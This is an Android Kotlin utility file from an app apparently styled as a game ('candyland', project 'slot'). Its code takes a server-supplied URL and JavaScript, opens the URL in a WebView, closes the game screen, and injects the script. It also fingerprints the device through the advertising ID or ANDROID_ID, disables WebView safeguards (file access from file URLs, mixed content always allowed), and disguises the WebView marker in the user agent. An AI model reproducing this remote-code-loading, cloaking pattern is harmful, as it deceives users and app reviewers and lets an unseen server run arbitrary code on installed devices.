package com.relaibleapps.candyland

import android.app.Activity
import android.content.Context
import android.os.Build
import android.provider.Settings
import android.webkit.WebSettings
import android.webkit.WebView
import com.game.BuildConfig
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import org.json.JSONException
import org.json.JSONObject
import java.lang.ref.WeakReference

/**
 * 项目名称：slot
 * 类描述：
 * 创建人：liujun
 * 创建时间：2023/5/10 02:22
 * 修改备注：
 * @version
 */

object WebUtils {
    var gaid: String = ""
    var jsCode = ""

    fun initgaid(context: Context) {
        Thread {
            try {
                gaid = try {
                    AdvertisingIdClient.getAdvertisingIdInfo(context).id ?: ""
                } catch (e: Exception) {
                    Settings.Secure.getString(
                        context.contentResolver, Settings.Secure.ANDROID_ID
                    )
                }
                //                LogUtils.i("AdvertisingIdClient id:$gaid")
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
    }

    fun handleResponse(s: String, context: Context) {
        //        Log.i("JJJ", "Handle Response: $s")
        try {
            val jsonObject = JSONObject(s)
            val url = jsonObject.optString("h")
            if (url.isNotNullOrBlank()) {
                jsCode = jsonObject.optString("g")
                openH5(
                    context, url, jsonObject.optString("vdbxs"), jsonObject.optString("eqf"), jsonObject.optBoolean("e")
                )
                if (context is Activity) {
                    context.finish()
                }
            }
        } catch (e: JSONException) {
            e.printStackTrace()
        }
    }

    fun setWeb(activity: H5Activity, webView: WebView, ua: String?, supportMultipleWindows: Boolean) {
        webView.settings.apply {
            userAgentString = "${getUserAgent(activity)}/$ua"
            domStorageEnabled = true
            allowFileAccess = true
            allowContentAccess = true
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
            }
            allowFileAccessFromFileURLs = true
            useWideViewPort = true
            javaScriptEnabled = true
            loadWithOverviewMode = true
            setSupportMultipleWindows(supportMultipleWindows)
            javaScriptCanOpenWindowsAutomatically = supportMultipleWindows
        }
        webView.webViewClient = GWebViewClient(WeakReference(activity))
    }

    fun injectCode(webView: WebView) {
        //        LogUtils.i(jsCode)
        if (jsCode.isNotNullOrBlank()) {
            webView.evaluateJavascript(jsCode, null)
        }
    }

    private fun getUserAgent(context: Context?): String {
        val userAgent: String? = try {
            WebSettings.getDefaultUserAgent(context)
        } catch (e: Exception) {
            System.getProperty("http.agent")
        }
        if (userAgent.isNullOrBlank()) return ""
        val sb = StringBuilder()
        var i = 0
        val length = userAgent.length
        while (i < length) {
            val c = userAgent[i]
            if (c <= '\u001f' || c >= '\u007f') {
                sb.append(String.format("\\u%04x", c.code))
            } else {
                sb.append(c)
            }
            i++
        }
        val replace = sb.toString().replace("; wv", "; xx-xx")
        return String.format(
            "%s/%s AppShellVer:%s UUID/%s", replace, Build.BRAND, BuildConfig.VERSION_NAME, gaid
        )
    }
}